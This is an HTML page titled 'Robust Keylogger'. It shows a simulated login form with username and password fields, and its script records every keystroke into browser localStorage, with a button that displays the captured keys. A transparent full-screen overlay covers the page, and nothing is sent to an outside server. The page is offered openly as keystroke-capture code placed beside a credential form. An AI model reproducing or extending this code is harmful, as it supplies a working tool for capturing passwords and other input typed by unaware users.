<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robust Keylogger</title>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        
        /* Invisible overlay that catches clicks/keys */
        #overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 99999;
            background: transparent;
        }

        /* Button to view logs */
        #viewBtn {
            position: fixed;
            bottom: 10px;
            right: 10px;
            z-index: 100000;
            padding: 10px;
            cursor: pointer;
            background: #333;
            color: #fff;
            border: none;
        }

        /* Log Display Area */
        #logContainer {
            display: none;
            position: fixed;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-height: 80vh;
            overflow-y: auto;
            background: white;
            border: 2px solid black;
            padding: 20px;
            z-index: 100001;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        
        .log-entry { margin-bottom: 5px; word-wrap: break-word; }
        .close-btn { float: right; cursor: pointer; font-weight: bold; color: red; }
    </style>
</head>
<body>

    <!-- Overlay to catch events even if you click outside inputs -->
    <div id="overlay"></div>

    <!-- Dummy Content to simulate a login page -->
    <h1>Login Page Simulation</h1>
    <input type="text" placeholder="Enter Username" style="display:block; margin-bottom:10px; padding:10px;">
    <input type="password" placeholder="Enter Password" style="display:block; margin-bottom:10px; padding:10px;">
    <button style="padding:10px;">Login</button>
    <p>Type anywhere on this page to test.</p>

    <!-- View Logs Button -->
    <button id="viewBtn">View Logs</button>

    <!-- Hidden Container for Logs -->
    <div id="logContainer">
        <span class="close-btn" onclick="document.getElementById('logContainer').style.display='none'">X</span>
        <h2>Captured Keystrokes</h2>
        <div id="logsOutput"></div>
    </div>

    <script>
        const logData = [];
        const overlay = document.getElementById('overlay');
        const viewBtn = document.getElementById('viewBtn');
        const logContainer = document.getElementById('logContainer');
        const logsOutput = document.getElementById('logsOutput');

        // Function to save logs
        function saveLogs() {
            try {
                localStorage.setItem('bz_logs', JSON.stringify(logData));
            } catch (e) {
                console.error("Storage failed", e);
            }
        }

        // Function to load and display logs
        function showLogs() {
            let storedLogs = localStorage.getItem('bz_logs');
            if (storedLogs) {
                const parsedLogs = JSON.parse(storedLogs);
                logsOutput.innerHTML = parsedLogs.map(log => 
                    `<div class="log-entry">${escapeHtml(log)}</div>`
                ).join('');
            } else {
                logsOutput.innerHTML = "<div>No logs yet.</div>";
            }
            logContainer.style.display = 'block';
        }

        // Helper to prevent HTML injection in logs
        function escapeHtml(text) {
            return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // Event Listener for Keydown
        document.addEventListener('keydown', function(e) {
            const key = e.key;
            
            // Map special keys to readable names
            let logKey = key;
            if (key === ' ') logKey = '[SPACE]';
            else if (key === 'Enter') logKey = '[ENTER]';
            else if (key === 'Backspace') logKey = '[BS]';
            else if (key === 'Tab') logKey = '[TAB]';
            else if (key === 'CapsLock') logKey = '[CAPS]';
            else if (key === 'Shift') logKey = '[SHIFT]';
            else if (key === 'Control') logKey = '[CTRL]';
            else if (key === 'Alt') logKey = '[ALT]';
            else if (key === 'Escape') logKey = '[ESC]';
            else if (key === 'Delete') logKey = '[DEL]';
            
            // Ignore modifier keys if pressed alone (optional, but cleaner)
            if (['Shift', 'Control', 'Alt', 'CapsLock'].includes(key) && !e.ctrlKey && !e.altKey && !e.metaKey) {
                return; 
            }

            logData.push(logKey);
            
            // Keep last 5000 chars worth of data to avoid storage limits
            if (logData.length > 5000) {
                logData.shift();
            }

            saveLogs();
        });

        // View Button Logic
        viewBtn.addEventListener('click', showLogs);

        // Initial Load
        showLogs();
    </script>
</body>
</html>
